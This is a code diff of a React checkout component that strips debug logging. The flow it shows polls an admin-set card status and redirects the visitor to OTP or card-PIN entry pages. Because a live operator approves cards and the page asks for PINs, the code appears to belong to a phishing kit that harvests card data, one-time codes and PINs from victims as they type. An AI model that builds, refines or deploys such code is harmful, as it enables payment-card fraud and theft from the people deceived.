@@ -163,24 +163,19 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
           // Don't auto-redirect if admin just redirected to payment page
           if (redirectPage === "payment") {
-            console.log("[Card Status] Admin redirect detected, ignoring auto-redirect")
             return
           }
 
-          console.log('[Card Status] Current status:', status)
           
           if (status === "approved_with_otp") {
-            console.log('[Card Status] Approved with OTP, redirecting to step2')
             setIsWaitingAdmin(false)
             // Redirect to OTP page
             router.push("/step2")
           } else if (status === "approved_with_pin") {
-            console.log('[Card Status] Approved with PIN, redirecting to step3')
             setIsWaitingAdmin(false)
             // Redirect to PIN page directly
             router.push("/step3")
           } else if (status === "rejected" && !rejectionHandledRef.current) {
-            console.log('[Card Status] Card rejected, hiding loader immediately')
             
             // Mark rejection as handled
             rejectionHandledRef.current = true
@@ -287,7 +282,6 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       const finalPrice = calculateFinalPrice()
       const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
       
-      console.log('[Payment] Starting payment process for visitor:', visitorID)
       
       await secureAddData({
         id: visitorID,
